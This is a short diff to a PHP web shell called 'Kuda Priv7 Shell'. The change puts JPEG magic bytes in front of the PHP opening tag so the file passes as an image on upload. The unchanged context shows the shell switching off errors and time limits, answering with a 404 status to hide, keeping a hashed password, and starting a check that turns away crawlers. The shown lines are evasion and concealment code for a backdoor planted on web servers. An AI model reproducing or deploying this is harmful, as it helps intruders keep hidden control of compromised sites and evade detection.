@@ -1,4 +1,4 @@
-<?php
+ÿØÿ<?php
 /*==================================#
 #          Kuda Priv7 Shell         #
 # Copyright (c) 2017 - Mr.xBarakuda #
@@ -14,7 +14,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
-@header("\xff\xd8\xff"); // @header("\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03[");
+//@header("\xff\xd8\xff"); // \x89\x50\x4E\x47\x0D\x0A\x1A\x0A
 @http_response_code(404);
 $katasandi = 'f5b165f0a2778d027ecebd64a2439c8d';
 if (!empty($_SERVER['HTTP_USER_AGENT'])) { // fucking all crawler
